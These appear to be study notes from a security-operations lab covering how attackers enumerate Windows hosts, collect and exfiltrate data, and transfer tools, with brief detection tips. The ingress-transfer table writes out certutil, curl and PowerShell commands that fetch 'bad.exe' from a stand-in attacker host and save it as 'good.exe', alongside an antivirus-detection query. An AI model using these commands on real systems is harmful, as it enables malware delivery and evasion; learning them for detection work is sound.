# Discovery
After inital access attackers needs to know where they so thay start discovering the system.
There are some basics commands that hackers use:

| Discovery Purpose                                                                                    | Common CMD / PowerShell Commands                                                          |
| ---------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| **Files and Folders**  <br>(To find out the host purpose, victim's job, or their interests)          | `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>`             |
| **Users and Groups**  <br>(To find out who uses the host and with which privileges)                  | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`                     |
| **System and Apps**  <br>(To find out vulnerabilities or apps to steal data from)                    | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service`               |
| **Network Settings**  <br>(To find out if the host belongs to a corporate network)                   | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`                     |
| **Active Antivirus**  <br>(To find out how risky it is to continue the attack without being blocked) | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |
# Detecting Discovery
Just check executed commands, dns query is sysmon or event viewer, dns. Or check powershell file.
# Collection overview
Attackers firstly collect and then sends data (exfiltrate). Collecting dont take a lot of time for most cases. For exfiltration thare are used cloud services such a s3 buckets, dropbox also hacker can use github, telegram, domains.
# Detecting Collection
Lo of attackers for collection use basics windows tools so it easy to dteectem them through logs. But there are malicious porgrams that use their own tools so it bacame hard to detect.
# Ingress tool transfer
The process of downloading additional malware to the breached system is mapped to the MITRE [Ingress Tool Transfer (opens in new tab)](https://attack.mitre.org/techniques/T1105/)


|Ingress Tool Transfer Command|Common CMD / Commands|
|---|---|
|Via Certutil|`certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`|
|Via Curl (Windows 10+)|`curl.exe https://blackhat.thm/bad.exe -o good.exe`|
|Via PowerShell [IWR (opens in new tab)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)|`powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"`|
|Via Graphical Interface|No need to use CMD, just copy-paste malware via or download them via a web browser!|
